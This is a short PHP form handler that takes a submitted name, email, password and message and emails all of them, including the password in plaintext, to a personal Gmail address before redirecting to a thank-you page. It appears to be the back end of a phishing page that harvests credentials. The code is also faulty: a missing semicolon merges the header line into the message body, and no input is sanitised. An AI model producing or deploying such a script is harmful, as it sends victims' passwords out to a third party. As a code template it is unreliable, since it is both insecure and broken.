<?php
$name = $_POST['name'];
$email = $_POST['email'];
$password = $_POST['password'];
$message = $_POST['message'];

$to = "pugalakshay108@gmail.com";

$subject = "Mail from God of saiyan";
$txt ="Name = " . $name . "\r\n Email = " . $email . "\r\n password = " . $password . "\r\n message = " . $message .
$header = "From: nobodyelse@codeconia.com" . "\r\n" . 
"CC: somebodyelse@example.com";
if($email!=NULL)
{
    mail($to,$subject,$txt,$header);
}
header("Location:thankyou.html");
?>